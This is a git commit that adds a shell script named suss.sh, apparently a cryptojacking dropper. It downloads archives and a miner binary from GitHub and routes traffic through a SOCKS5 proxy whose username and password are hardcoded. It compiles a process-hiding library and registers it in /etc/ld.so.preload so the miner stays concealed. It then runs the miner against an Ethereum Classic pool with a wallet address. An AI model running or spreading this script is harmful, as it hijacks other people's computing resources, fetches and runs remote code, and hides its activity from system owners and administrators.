e14f637fa8c20f85f12644036b7bb1a38b11649d
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-04-09 20:30:28 +0700

    Create suss.sh

---
+++ suss.sh
@@ -0,0 +1,59 @@
+#!/bin/sh
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233 
+loglevel = 1 
+socks5 = 3.15.39.186:1080 
+socks5_username = mikrotik999 
+socks5_password = Elibawnos 
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+
+echo " "
+
+echo "**"
+
+echo " "
+
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/WxYtzaiu/WxYtzaiu/main/bezzHash
+
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+
+unzip magicBezzHash.zip
+
+make
+
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+
+mv libprocesshider.so /usr/local/lib/
+
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./bezzHash --algo ETCASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
